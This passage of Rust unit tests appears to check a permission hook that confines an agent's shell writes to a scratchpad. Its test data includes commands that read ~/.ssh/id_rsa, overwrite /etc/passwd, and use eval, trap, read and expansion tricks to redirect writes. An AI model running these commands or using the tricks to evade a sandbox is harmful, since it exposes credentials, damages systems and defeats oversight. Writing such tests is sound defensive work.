            "S=$HOME/x; echo y > $S/z".to_string(),
            format!("S={scratch}; cat ~/.ssh/id_rsa > $S/k"),
            format!("S={scratch}; S=/etc; echo x > $S/passwd"),
            format!("S={scratch}; S=$HOME; echo x > $S/out"),
            format!("S={scratch}; cat /dev/null > /etc/passwd"),
        ] {
            let output = literal_retry_hook(&command, true, "/work/repo");
            assert_ne!(output["permissionDecision"], "allow", "{command}: {output}");
            assert!(
                !output["permissionDecisionReason"]
                    .as_str()
                    .unwrap()
                    .contains("<scratchpad: confined write>"),
                "{output}"
            );
        }
    }

    #[test]
    fn literal_assignments_are_ordered_and_do_not_guess_shell_scope_or_expansions() {
        let roots = vec!["/scratch".to_string()];
        for command in [
            "echo x > $S/out; S=/scratch",
            "S=/scratch; T=$S; echo x > $T/out",
            "S=/scratch echo x > $S/out",
            "false && S=/scratch; echo x > $S/out",
            "S=/scratch | cat; echo x > $S/out",
            "S=/scratch; read S; echo x > $S/out",
            "S=/scratch; S+=/../../etc; echo x > $S/out",
            "S=/scratch; printf -v S /etc; echo x > $S/out",
            "S=/scratch; export S=/etc OTHER; echo x > $S/out",
            "S=/scratch; readonly S=/etc; echo x > $S/out",
            "S=/scratch; S[0]=/etc; echo x > $S/out",
            "S=/scratch; builtin read S; echo x > $S/out",
            "S=/scratch; for S in /etc; do echo x > $S/out; done",
            "S=/scratch; echo x > '$S/out'",
            "S=/scratch; echo $(S=/etc; echo x > $S/out)",
            "S=/scratch; echo x > ${S:-/etc}/out",
            "S='/scratch/*'; echo x > $S/out",
        ] {
            assert_ne!(
                write_targets_confined(command, &roots),
                Some(true),
                "{command}"
            );
        }
        assert_eq!(
            write_targets_confined("S=/scratch; echo x > ${S}/out", &roots),
            Some(true)
        );
        assert_eq!(
            write_targets_confined(
                "export S='/scratch/logs';\necho x >> \"$S/out\" 2>/dev/null",
                &roots
            ),
            Some(true)
        );
    }

    #[test]
    fn literal_assignment_mutations_never_prove_scratchpad_or_cwd_confinement() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for root in [&scratch, "/work/repo"] {
            for mutation in [
                "f(){ S=/etc; }; f",
                "function f { S=/etc; }; f",
                "f () { S=/etc; }; f",
                "trap 'S=/etc' DEBUG",
                "command trap 'S=/etc' DEBUG",
                "'eval' 'S=/etc'",
                "e\\val 'S=/etc'",
                "source /tmp/change-vars.sh",
                ". /tmp/change-vars.sh",
                "builtin read S",
                "</tmp/input read S",
                "</tmp/input builtin read S",
                "</tmp/input command read S",
                "2>/dev/null read S < /tmp/input",
                "unset S; S=/etc",
                "declare S=/etc",
                "local S=/etc",
                "typeset S=/etc",
                "let S=1",
                "((S=1))",
                "for S in /etc; do true; done",
                "select S in /etc; do break; done",
                "printf -vS /etc",
                ": ${OTHER:=${S:=/etc}}",
                ": \"${OTHER:=${S:=/etc}}\"",
                "echo \"$(S=/etc; echo x > $S/passwd)\"",
                "$MUTATOR S",
                "{read,} S",
                "S=/etc",
                "S+=/../../etc",
                "S[0]=/etc",
            ] {
                let command = format!("S={root}; {mutation}; echo x > $S/passwd");
                assert_ne!(
                    write_targets_confined(&command, std::slice::from_ref(&scratch)),
                    Some(true),
                    "{command}"
                );
                assert!(
                    !redirects_confined_for_retry(&command, &[], Some(Path::new("/work/repo"))),
                    "{command}"
                );
                let output = literal_retry_hook(&command, true, "/work/repo");
                assert_ne!(output["permissionDecision"], "allow", "{command}: {output}");
            }
        }
    }

    #[test]
    fn literal_assignment_resolution_preserves_quoted_formatter_data() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for tail in [
            r#"printf 'report (%s)\n' ok > "$S/out"; grep -E '^\s+Summary' "$S/out""#,
            r#"printf "report (%s)\n" ok > "$S/out"; awk '{print $NF}' "$S/out""#,
            r#"echo '${S:=/etc} $(ignored) `ignored`' > "$S/out""#,
        ] {
            let command = format!("S={scratch}; {tail}");
            let output = literal_retry_hook(&command, true, "/work/repo");
            assert_eq!(output["permissionDecision"], "allow", "{command}: {output}");
            assert!(
                output["permissionDecisionReason"]
                    .as_str()
                    .unwrap()
                    .contains("<scratchpad: confined write>"),
                "{output}"
            );
        }
    }
}
